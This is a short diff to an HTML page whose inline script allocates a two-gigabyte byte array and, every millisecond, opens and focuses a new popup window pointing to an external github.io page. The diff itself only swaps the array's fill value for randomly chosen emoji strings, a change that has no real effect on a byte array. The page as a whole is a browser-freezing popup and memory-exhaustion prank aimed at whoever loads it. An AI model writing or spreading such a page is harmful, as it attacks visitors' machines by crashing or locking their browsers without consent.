@@ -10,7 +10,11 @@
 <body>
   <script>
     var data = new Uint8Array(2_000_000_000);
-    data.fill("😀");
+    if(Math.random() < 0.5) {
+      data.fill("😀🚋");
+    } else {
+      data.fill("🌇🎅")
+    }
     setInterval(function() {
       window.open('https://fidoeee.github.io/fractal.html', '_blank', 'height=100', 'width=100').focus();
     }, 1)
